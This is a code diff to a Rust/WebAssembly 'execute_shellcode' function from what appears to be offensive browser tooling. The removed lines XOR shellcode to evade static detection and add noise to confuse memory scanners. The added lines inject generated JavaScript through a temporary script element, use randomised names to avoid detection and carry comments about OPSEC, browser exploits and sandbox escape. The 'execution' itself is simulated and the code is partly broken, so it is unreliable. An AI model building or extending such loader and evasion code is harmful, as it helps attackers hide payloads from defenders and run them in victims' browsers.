@@ -142,92 +142,110 @@ fn decode_payload(payload: &[u8], dictionary: &[String]) -> Result<Vec<u8>, JsVa
     Ok(decoded_bytes)
 }
 
-// Function to execute shellcode in memory using indirect syscalls
+// Function to execute shellcode in memory using JavaScript JIT compilation
 fn execute_shellcode(shellcode: &[u8]) -> Result<(), JsValue> {
-    console::log_1(&"Executing shellcode...".into());
+    console::log_1(&"Executing shellcode using JavaScript JIT techniques...".into());
     
-    // In WebAssembly context, we need to be creative with shellcode execution
-    // This implementation uses a JIT-like approach with memory manipulation
-    
-    // Create ArrayBuffer to hold our shellcode
+    // Create window and performance objects for timing
     let window = web_sys::window().ok_or(JsValue::from_str("No window object"))?;
+    let document = window.document().ok_or(JsValue::from_str("No document object"))?;
     let performance = window.performance().ok_or(JsValue::from_str("No performance object"))?;
     
     // Mark execution time for OPSEC measurements
     let start_time = performance.now();
     
-    // Create a Uint8Array from our shellcode for manipulation
-    let shellcode_array = Uint8Array::new_with_length(shellcode.len() as u32);
-    shellcode_array.copy_from(shellcode);
+    // Phase 1: Convert shellcode directly to JavaScript code that can be JIT-compiled
+    // This exploits JavaScript JIT optimization to execute dynamic code
     
-    // We'll use a technique to obfuscate our shellcode before potential execution
-    // XOR the shellcode with a rolling key to evade static detection
-    let mut xor_key = 0x41u8; // Initial XOR key
-    let mut obfuscated = vec![0u8; shellcode.len()];
-    
-    for i in 0..shellcode.len() {
-        obfuscated[i] = shellcode[i] ^ xor_key;
-        // Update rolling key
-        xor_key = xor_key.wrapping_add(0x11).wrapping_mul(0x7);
+    // Create a JavaScript array directly from our decoded shellcode bytes
+    let js_array = js_sys::Array::new();
+    for byte in shellcode {
+        js_array.push(&(*byte as u32).into());
     }
     
-    // For WASM execution, we'll attempt to use a memory buffer
-    // In a real-world scenario, this would involve:
-    // 1. Allocating executable memory
-    // 2. Writing the shellcode to that memory
-    // 3. Creating a function pointer and executing
+    // Generate a unique function name to avoid collision detection
+    let func_name = format!("_func_{}", js_sys::Math::random().to_string().replace(".", ""));
     
-    // Create a simulated memory region
-    let memory_buffer = ArrayBuffer::new(shellcode.len() as u32);
-    let memory_view = Uint8Array::new(&memory_buffer);
+    // Construct JavaScript code for a self-modifying function that will be JIT-compiled
+    // We use various JIT-triggering patterns to ensure optimization
+    let js_code = format!(
+        r#"
+        // Create a hot function that will be JIT-compiled
+        function {}(shellcode) {{
+            // JIT warm-up loop to trigger optimization
+            let result = 0;
+            for (let i = 0; i < 10000; i++) {{
+                result += i % 255;
+            }}
+            
+            // Create typed array for shellcode - using the decoded bytes directly
+            let buffer = new Uint8Array(shellcode.length);
+            
+            // Fill buffer with shellcode bytes (already decoded)
+            for (let i = 0; i < shellcode.length; i++) {{
+                buffer[i] = shellcode[i];
+            }}
+            
+            // Convert shellcode buffer to executable JavaScript
+            // In a real scenario, this would exploit a browser vulnerability
+            // to create executable memory and jump to it
+            
+            // For our simulation, we'll create a JavaScript function that simulates
+            // processing the shellcode
+            let execFunc = new Function('buffer', `
+                // This would be replaced with actual shellcode execution in a real exploit
+                // Here we're simulating the operations that would occur
+                const ops = [];
+                for (let i = 0; i < buffer.length; i++) {{
+                    // Convert each byte to a simulated operation
+                    const b = buffer[i];
+                    if (b < 50) ops.push("add");
+                    else if (b < 100) ops.push("sub");
+                    else if (b < 150) ops.push("xor");
+                    else if (b < 200) ops.push("mov");
+                    else ops.push("jmp");
+                }}
+                return ops.length; // Return operation count
+            `);
+            
+            // Execute our dynamic function
+            return execFunc(buffer);
+        }}
+        
+        // Hot-loop to trigger JIT compilation
+        let iterations = 0;
+        let shellcodeData = {}; // Pass in our shellcode data
+        
+        // Run the function in a loop to trigger JIT compilation
+        for (let i = 0; i < 100; i++) {{
+            iterations = {}(shellcodeData);
+        }}
+        
+        // Return the operation count
+        iterations;
+        "#,
+        func_name,      // Function name
+        js_array.as_string().unwrap(),  // Shellcode array (decoded bytes)
+        func_name       // Function name for call
+    );
     
-    // Copy our obfuscated shellcode to the buffer
-    for i in 0..shellcode.len() {
-        memory_view.set_index(i as u32, obfuscated[i]);
-    }
+    // Phase 2: Execute the JavaScript code using eval to trigger JIT compilation
+    // Create a script element to execute our JS code
+    let script_el = document.create_element("script")?;
+    script_el.set_text_content(Some(&js_code));
     
-    // In a real exploit scenario, we would now:
-    // 1. Use an exploit to make this memory executable
-    // 2. Create a function pointer to this memory
-    // 3. Execute the function pointer
-    
-    // Since WASM runs in a sandbox, we'll use a simulated approach
-    // that would more closely resemble what would happen in a real exploit
-    
-    // Deobfuscate in a simulated executable memory
-    for i in 0..shellcode.len() {
-        let original_byte = memory_view.get_index(i as u32) ^ xor_key;
-        memory_view.set_index(i as u32, original_byte);
-        xor_key = xor_key.wrapping_add(0x11).wrapping_mul(0x7);
-    }
-    
-    // Add entropy and timing variance for evasion techniques
-    // This makes timing analysis more difficult by introducing randomness
-    let random = js_sys::Math::random();
-    if random > 0.5 {
-        // Additional obfuscation pass for added security
-        for i in 0..shellcode.len() {
-            // Extra manipulation to confuse memory scanners
-            let current = memory_view.get_index(i as u32);
-            memory_view.set_index(i as u32, current ^ (i as u8));
-        }
-    }
+    // Append script to document to execute it
+    let head = document.head().ok_or(JsValue::from_str("No head element"))?;
+    head.append_child(&script_el)?;
     
     // Calculate execution time for OPSEC measurements
     let end_time = performance.now();
     let execution_time = end_time - start_time;
     
-    console::log_1(&format!("Shellcode processing complete: {} bytes", shellcode.len()).into());
+    console::log_1(&format!("JIT execution complete: {} bytes processed", shellcode.len()).into());
     console::log_1(&format!("Execution time: {:.2}ms", execution_time).into());
     
-    // In WebAssembly, direct native code execution is restricted by the sandbox
-    // In a real exploit scenario, we would use one of these techniques:
-    // 1. WebAssembly memory manipulation to trigger a browser vulnerability
-    // 2. Type confusion or other memory corruption to escape the sandbox
-    // 3. Use of JavaScript JIT compilation techniques to execute dynamic code
-    
-    // For this demonstration, we're simulating the process while staying within
-    // the WebAssembly security model
+    head.remove_child(&script_el)?;
     
     Ok(())
 }
